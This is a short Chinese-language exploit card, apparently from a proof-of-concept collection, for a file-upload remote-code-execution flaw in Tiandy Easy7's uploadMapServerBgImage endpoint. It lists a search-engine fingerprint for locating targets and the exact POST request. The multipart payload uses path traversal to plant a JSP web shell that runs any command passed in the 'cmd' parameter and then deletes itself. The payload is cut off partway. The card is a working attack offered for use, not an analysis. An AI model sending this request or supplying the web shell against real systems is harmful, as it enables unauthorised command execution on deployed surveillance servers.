# 天地伟业Easy7uploadMapServerBgImage存在文件上传致RCE漏洞

- **系统**：天地伟业　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Tiandy-Easy7"`
- **请求**：`POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="uploadParams";
[{"path":"../Easy7/","name":"1.jsp"}]
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFf…（脚本共 675 字，完整版见原文）
```
- **预期**：200　|　—